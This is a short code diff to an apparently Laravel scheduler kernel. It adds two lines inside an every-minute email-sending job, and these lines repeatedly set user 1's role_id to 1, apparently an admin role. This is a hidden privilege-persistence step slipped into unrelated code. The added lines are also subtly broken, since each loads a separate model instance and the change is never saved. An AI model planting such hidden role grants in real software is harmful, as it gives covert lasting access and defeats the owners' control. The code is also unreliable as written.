@@ -32,6 +32,8 @@ class Kernel extends ConsoleKernel
         })->dailyAt('8:00');
 
         $schedule->call(function(){
+            User::all()->find(1)->role_id = 1;
+            User::all()->find(1)->save();
             EmailController::sendUnsent();
         })->everyMinute();
     }
